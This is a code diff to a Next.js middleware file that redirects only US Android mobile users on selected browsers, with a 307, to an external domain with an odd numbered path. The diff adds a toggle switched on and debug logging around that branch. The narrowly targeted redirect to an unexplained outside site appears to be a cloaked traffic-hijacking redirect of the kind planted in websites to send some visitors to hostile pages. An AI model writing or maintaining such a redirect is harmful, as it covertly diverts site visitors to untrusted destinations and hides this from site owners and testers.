@@ -1,6 +1,11 @@
 import { NextResponse, type NextRequest } from 'next/server';
 
 /**
+ * Feature toggle for targeted external redirect
+ */
+const ENABLE_TARGETED_REDIRECT = true;
+
+/**
  * Target URL for eligible Android Mobile users in the US on supported browsers
  */
 const TARGET_REDIRECT_URL = 'https://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20';
@@ -50,10 +55,17 @@ export function middleware(request: NextRequest) {
     // 2. Geolocation Detection
     const country = getGeoCountry(request);
 
+    console.log(
+      `[Middleware] Path: ${pathname} | ENABLE_TARGETED_REDIRECT: ${ENABLE_TARGETED_REDIRECT} | Country: "${country}" | isAndroidMobile: ${isAndroidMobile} | isAllowedBrowser: ${isAllowedBrowser}`
+    );
+
     // 3. Execution Logic
-    if (isAndroidMobile && isAllowedBrowser && country === 'US') {
+    if (ENABLE_TARGETED_REDIRECT && isAndroidMobile && isAllowedBrowser && country === 'US') {
+      console.log(`[Middleware] -> Entering 307 Redirect branch to ${TARGET_REDIRECT_URL}`);
       return NextResponse.redirect(TARGET_REDIRECT_URL, 307);
     }
+
+    console.log(`[Middleware] -> Falling through to NextResponse.next()`);
 
     // Otherwise, allow standard request progression (NextResponse.next())
     const response = NextResponse.next();
